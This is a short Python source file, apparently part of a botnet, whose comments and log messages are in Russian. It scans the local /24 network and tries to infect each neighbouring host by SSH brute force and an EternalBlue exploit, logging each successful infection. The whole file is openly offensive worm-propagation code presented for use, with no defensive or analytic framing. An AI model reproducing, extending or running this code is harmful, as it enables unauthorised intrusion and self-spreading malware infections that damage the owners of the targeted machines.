import asyncio, ipaddress, socket, random
from botnet.spreader import ssh_bruteforce, exploit_eternalblue, add_bot
from utils.logger import log

async def lateral_scan(local_ip):
    """Сканирует локальную сеть и пытается заразить соседей"""
    network = ipaddress.IPv4Network(f"{local_ip}/24", strict=False)
    tasks = []
    for host in network.hosts():
        target = str(host)
        if target == local_ip:
            continue
        tasks.append(attack_neighbor(target))
    await asyncio.gather(*tasks)

async def attack_neighbor(ip):
    # SSH
    s, _ = await ssh_bruteforce(ip)
    if s:
        log(f"[Lateral] Заразил соседа {ip} через SSH")
        return
    # EternalBlue (Windows)
    if await exploit_eternalblue(ip):
        log(f"[Lateral] Заразил соседа {ip} через EternalBlue")
        return
